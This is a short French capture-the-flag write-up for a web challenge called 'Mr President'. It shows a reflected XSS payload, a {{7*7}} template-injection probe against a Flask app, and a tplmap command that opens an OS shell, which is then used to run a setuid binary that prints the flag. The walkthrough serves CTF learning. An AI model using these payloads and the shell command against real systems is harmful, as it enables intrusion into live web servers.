**WEB - Mr President - 2500**

Le site mis à disposition est un générateur de texte sur une image de Trump.

__Résolution :__

Le mot qui est passé à la variable **name** en GET est affiché en gros sur l'image :

```
http://mrpresident.sthack.fr/banish?name=Ryan
```

On repère rapidement une XSS :

```javascript
http://mrpresident.sthack.fr/banish?name=<script>alert(1)</script>
```

Aucun formulaire de contact donc nous passons à autre chose.

Si nous appelons une page qui n'existe pas, le site nous retourne comme information qu'il est développé avec flask.

On tente :

```
http://mrpresident.sthack.fr/banish?name=Ryan{{7*7}}
```

Nous obtenons comme retour  : Ryan49

Nous avons donc une template injection.

On récupère un shell avec [TPLMAP](https://github.com/epinna/tplmap) :

```BASH
./tplmap.py --os-shell -u 'http://mrpresident.sthack.fr/banish?name=Ryan'
```

On cherche le flag :


```BASH
posix-linux2 $ ls -lash /flag/is/here
total 28
     4 drwxr-xr-x    1 root     root        4.0K Apr  5 12:35 .
     4 drwxr-xr-x    1 root     root        4.0K Apr  5 12:35 ..
     4 -r--------    1 root     root          17 Mar  4 23:09 flag
     4 -rw-r--r--    1 root     root         198 Mar  4 23:13 getflag.c
    12 -rwsr-xr-x    1 root     root       10.5K Apr  5 12:35 runme
```

On affiche le flag :

```BASH
posix-linux2 $ cd /flag/is/here/;./runme
Y0u_G0t_TrUmp3d!
```



By team Beers4Flags


```
 ________
|        |
|  #BFF  |
|________|
   _.._,_|,_
  (      |   )
   ]~,"-.-~~[
 .=] Beers ([
 | ])  4   ([
 '=]) Flags [
   |:: '    |
    ~~----~~
```